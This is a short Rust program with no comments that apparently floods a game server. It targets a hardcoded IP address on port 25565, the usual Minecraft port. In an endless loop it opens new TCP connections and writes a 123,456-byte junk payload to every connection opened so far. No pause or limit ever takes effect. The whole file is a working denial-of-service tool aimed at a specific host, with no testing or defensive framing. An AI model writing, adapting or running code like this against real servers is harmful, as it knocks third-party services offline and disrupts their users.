use std::{
    io::Write,
    net::{SocketAddr, TcpStream},
    time::Duration,
};

fn main() {
    const payload: &'static [u8] = &[123; 123456];
    let addr: SocketAddr = "158.180.88.171:25565".parse().unwrap();
    struct Player {
        stream: TcpStream,
    }
    const client_amount: usize = 1000;
    let mut clients = Vec::<Player>::with_capacity(client_amount);
    let delay = Duration::from_millis(50);
    loop {
        for client in clients.iter_mut() {
            client.stream.write_all(payload).unwrap();
        }
        let mut stream = TcpStream::connect::<SocketAddr>(addr).unwrap();
        clients.push(Player { stream });
    }
}
